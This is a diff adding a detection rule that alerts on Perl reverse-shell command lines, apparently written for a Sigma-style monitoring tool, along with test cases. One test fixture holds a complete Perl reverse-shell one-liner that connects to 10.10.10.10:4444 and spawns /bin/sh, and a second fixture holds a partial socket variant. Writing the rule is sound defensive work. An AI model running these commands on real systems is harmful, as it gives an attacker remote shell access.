@@ -1,0 +1,20 @@
+name: sigma_perl_reverse_shell
+mode: alert
+eval: |
+  (
+    (e.process_name == "perl" && e.process_args.contains(" -e ")) && (((e.process_args.contains("fdopen(") && e.process_args.contains("::Socket::INET")) || (e.process_args.contains("Socket") && e.process_args.contains("connect") && e.process_args.contains("open") && e.process_args.contains("exec"))))
+  )
+
+tests:
+  - cleartext: "perl reverse shell with Socket connect open exec"
+    process_name: perl
+    process_args: "perl -e 'use Socket;$i=\"10.10.10.10\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
+    should_match: true
+  - cleartext: "perl with fdopen and Socket::INET"
+    process_name: perl
+    process_args: "perl -e 'use IO::Socket::INET;$sock=IO::Socket::INET->new(PeerAddr=>\"10.10.10.10\",PeerPort=>4444);open(STDIN,\">&\",fileno(fdopen($sock)));'"
+    should_match: true
+  - cleartext: "normal perl"
+    process_name: perl
+    process_args: "perl script.pl"
+    should_match: false
